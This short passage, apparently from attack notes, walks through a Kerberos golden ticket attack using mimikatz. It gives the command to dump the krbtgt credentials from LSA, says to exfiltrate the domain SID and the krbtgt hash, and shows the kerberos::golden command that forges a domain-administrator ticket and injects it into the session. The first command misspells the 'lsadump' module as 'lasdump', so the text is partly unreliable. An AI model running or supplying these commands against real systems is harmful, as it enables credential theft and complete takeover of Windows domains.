To perform this, we need to dump the `krbtgt` account credentials using mimikatz.

```sh
lasdump::lsa /inject /name:krbtgt
```


We can then exfiltrate the `sid` of the domain and the kerberos hash of the TGT.

We can then run the following command

```sh
kerberos::golden /User:<username> /domain:<domain_name> /sid:<sid_of_the_domain> /krbtgt:<kerberos_hash> /id:500 /ptt
```
ptt: Pass the ticket


